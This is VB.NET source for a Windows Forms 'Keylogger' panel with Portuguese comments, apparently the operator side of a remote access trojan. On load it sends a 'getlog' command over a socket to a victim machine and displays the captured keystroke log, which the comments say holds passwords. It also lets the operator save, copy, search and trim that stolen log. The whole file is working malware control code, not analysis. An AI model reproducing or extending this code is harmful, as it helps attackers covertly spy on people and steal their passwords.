Imports System.IO
Imports System.Text
Imports System.ComponentModel
Imports System.Windows.Forms.MessageBox 'para manter todas as messagebox em superior ou forme na hora de ser exebidas
Imports System.Windows.Forms.TextBox


'Coded Py Pjoao1578
'v4
Public Class Keylogger
#Region "key off"
    Public sock As Integer
    Dim yy As String = "||" 'yy = "||" = senha
#End Region

    Private Sub Keylogger_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.TextBox1.Clear() 'limpar text
        Form1.s.Send(sock, "getlog" & yy & Form1.s.IP(sock)) 'chamar logs
    End Sub

    Private Sub UpdeterLogToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdeterLogToolStripMenuItem.Click
        'atualizar keylogger offine
        Me.TextBox1.Clear() 'limpar text
        Form1.s.Send(sock, "getlog" & yy & Form1.s.IP(sock)) 'chamar logs
    End Sub

    Private Sub DeleteLogToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteLogToolStripMenuItem.Click
        Me.TextBox1.Clear() 'limpar text
        MsgBox("  Foi Deletado", MessageBoxIcon.Error) 'Mensagem
    End Sub

    Private Sub SaveLogEmTXTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveLogEmTXTToolStripMenuItem.Click
        'salvar em txt a pass do keylogger offine
        Dim sd As New SaveFileDialog()
        sd.Filter = "Pass Log TXT (*.txt)|*.txt" '.txt
        sd.FileName = "Log.txt" 'name
        If sd.ShowDialog() = Windows.Forms.DialogResult.OK Then
            Dim b As New StringBuilder()
            b.Append(TextBox1.Text & vbNewLine)
            IO.File.WriteAllText(sd.FileName, b.ToString())
            MessageBox.Show("Salvo Em TXT", "Salvo", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'Mensagem
        End If
    End Sub

    Private Sub CopyAllTXTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyAllTXTToolStripMenuItem.Click
        Me.TextBox1.SelectAll() 'select all txt
        Try
            My.Computer.Clipboard.SetText(Me.TextBox1.Text) 'copy txt all
        Catch ex As Exception 'erro nao report
        End Try
        MessageBox.Show("TXT Copiado", "Copiado !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
    End Sub

    Private Sub SelectCopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SelectCopyToolStripMenuItem.Click
        Try
            My.Computer.Clipboard.SetText(Me.TextBox1.SelectedText) 'copy txt Selected
        Catch ex As Exception 'erro nao report
        End Try
        MessageBox.Show("TXT Copiado", "Copiado !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
    End Sub

    Private Sub Keylogger_Closed(sender As Object, e As EventArgs) Handles Me.Closed
        Me.TextBox1.Clear() 'limpar
        Me.TextBox2.Clear() 'limpar
    End Sub

    Private Sub Keylogger_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Me.TextBox1.Clear() 'limpar
        Me.TextBox2.Clear() 'limpar
    End Sub

    Private Sub TextBox1_DoubleClick(sender As Object, e As EventArgs)
        'DoubleClick show
        Me.Panel1.Visible = True
        Me.Button1.Visible = True
        Me.Button2.Visible = True
        Me.TextBox2.Visible = True
    End Sub

    Private Sub TextBox1_Click(sender As Object, e As EventArgs)
        'click hide
        Me.Panel1.Visible = False
        Me.Button1.Visible = False
        Me.Button2.Visible = False
        Me.TextBox2.Visible = False
    End Sub

    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click
        'deleti palavras escolhida do keylogger offine
        Dim Linhas = Me.TextBox1.Text.Split(System.Environment.NewLine)
        Me.TextBox1.Text = String.Empty
        For Each Linha As String In Linhas
            Dim Inicio As Integer = Linha.IndexOf(Me.TextBox2.Text)
            If (Inicio <> -1) Then
                Linha = Linha.Replace(Linha.Substring(Inicio), "")
                Me.TextBox1.Text += Linha + System.Environment.NewLine
            Else
                Me.TextBox1.Text += Linha + System.Environment.NewLine
            End If
        Next
        MessageBox.Show("Foi Deletado", "Deletado", MessageBoxButtons.OK, MessageBoxIcon.Error) 'Mensagem
    End Sub

    Private Sub Button2_Click_1(sender As Object, e As EventArgs) Handles Button2.Click
        'procurar uma palavra ou letra no keylogger offine
        Dim lngInicio As Long
        Try
            lngInicio = InStr(Me.TextBox1.Text, Me.TextBox2.Text)

            If lngInicio > -1 Then
                TextBox1.Select(lngInicio - 1, Me.TextBox2.TextLength)
                TextBox1.Focus()
                TextBox1.ScrollToCaret()
            End If
        Catch ex As Exception
            MessageBox.Show("Erro !! Não Encontrada", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'Mensagem
        End Try
    End Sub
End Class